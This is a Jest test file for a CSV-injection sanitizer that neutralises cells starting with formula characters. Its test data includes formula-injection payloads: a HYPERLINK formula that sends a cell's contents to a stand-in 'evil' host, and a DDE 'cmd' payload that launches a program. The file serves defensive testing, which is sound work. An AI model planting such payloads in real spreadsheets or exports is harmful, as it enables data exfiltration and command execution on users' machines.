/* eslint-disable @typescript-eslint/naming-convention */

import { neutralizeCsvCell, neutralizeCsvRecord, neutralizeCsvRow } from '../../../src/utils/csv-sanitizer';

describe('neutralizeCsvCell', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])('prefixes a value starting with %j with an apostrophe', (prefix) => {
    const value = `${prefix}HYPERLINK("https://evil/","report")`;
    expect(neutralizeCsvCell(value)).toBe(`'${value}`);
  });

  it('neutralizes a leading-equals formula payload from the ticket example', () => {
    expect(neutralizeCsvCell('=HYPERLINK("https://evil/?="&A1,"report")')).toBe(
      `'=HYPERLINK("https://evil/?="&A1,"report")`
    );
  });

  it('leaves an ordinary string unchanged', () => {
    expect(neutralizeCsvCell('Cardiff')).toBe('Cardiff');
  });

  it('leaves a string with an internal but non-leading dangerous character unchanged', () => {
    expect(neutralizeCsvCell('Total = 100')).toBe('Total = 100');
  });

  it('leaves a number unchanged (and does not coerce it to a string)', () => {
    expect(neutralizeCsvCell(100)).toBe(100);
  });

  it('leaves a negative number unchanged', () => {
    expect(neutralizeCsvCell(-5)).toBe(-5);
  });

  it('leaves null unchanged', () => {
    expect(neutralizeCsvCell(null)).toBeNull();
  });

  it('leaves undefined unchanged', () => {
    expect(neutralizeCsvCell(undefined)).toBeUndefined();
  });

  it('leaves a boolean unchanged', () => {
    expect(neutralizeCsvCell(true)).toBe(true);
  });
});

describe('neutralizeCsvRow', () => {
  it('neutralizes only the dangerous entries in a positional row', () => {
    const row = ['Cardiff', '=1+1', 100, '@SUM(A1:A2)'];
    expect(neutralizeCsvRow(row)).toEqual(['Cardiff', "'=1+1", 100, "'@SUM(A1:A2)"]);
  });

  it('returns an empty array unchanged', () => {
    expect(neutralizeCsvRow([])).toEqual([]);
  });
});

describe('neutralizeCsvRecord', () => {
  it('neutralizes dangerous values but leaves safe keys and numeric values unchanged', () => {
    const record = { Area: 'Cardiff', Year: 2020, Notes: '=cmd|"/c calc"!A1' };
    expect(neutralizeCsvRecord(record)).toEqual({
      Area: 'Cardiff',
      Year: 2020,
      Notes: `'=cmd|"/c calc"!A1`
    });
  });

  it('neutralizes a dangerous key (e.g. an attacker-controlled dimension name used as a header)', () => {
    const record = { '=HYPERLINK("https://evil/")': 'value' };
    expect(neutralizeCsvRecord(record)).toEqual({
      [`'=HYPERLINK("https://evil/")`]: 'value'
    });
  });

  it('leaves null and undefined values unchanged', () => {
    const record = { a: null, b: undefined };
    expect(neutralizeCsvRecord(record)).toEqual({ a: null, b: undefined });
  });
});
